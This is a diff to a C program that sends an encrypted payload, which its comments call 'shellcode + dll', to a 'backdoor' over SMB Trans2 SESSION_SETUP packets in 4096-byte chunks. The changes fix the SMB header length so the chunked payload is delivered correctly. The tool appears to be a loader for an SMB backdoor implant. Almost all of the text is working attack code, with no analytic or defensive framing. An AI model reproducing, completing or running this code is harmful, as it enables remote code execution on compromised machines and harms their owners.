@@ -331,6 +331,12 @@ int main(int argc, char* argv[])
 			big_packet[51] = '\x1a';
 			big_packet[52] = '\x00';
 			
+			//since this packet is smaller than the rest
+			//Generate new memory location with the size of: bytesLeft+32+34+12
+			//the total SMB length has to be changed because this packet is smaller than the rest
+			smblen = bytesLeft+32+34+12; //BytesLeft + SMB header + Trans2 header + Trans2_SESSION_DATA parameter
+			memcpy(big_packet+3, &smblen, 1);
+			
 			printf("Bytes left is less than 4096!...Generating smaller packet!\n");
 			memcpy(big_packet +  sizeof(trans2_request), (unsigned char*)encrypted + ctx, bytesLeft);
 			//send(s, (char*)Trans2SESSION, 4178, 0);
@@ -369,6 +375,11 @@ int main(int argc, char* argv[])
 		//FIX ME
 		//fix data len values
 		//Trans2.Session_Data_Length = sizeof(encrypted);
+		
+		//FIX ME
+		//fix SMB data length in SMB header
+		smblen = 4096+32+34+12; //4096 + SMB header + Trans2 header + Trans2_SESSION_DATA parameter
+		memcpy(big_packet+3, &smblen, 1);
 
 		//send the payload(shellcode + dll) in chunk of 0x1000(4096) bytes to backdoor.
 		send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
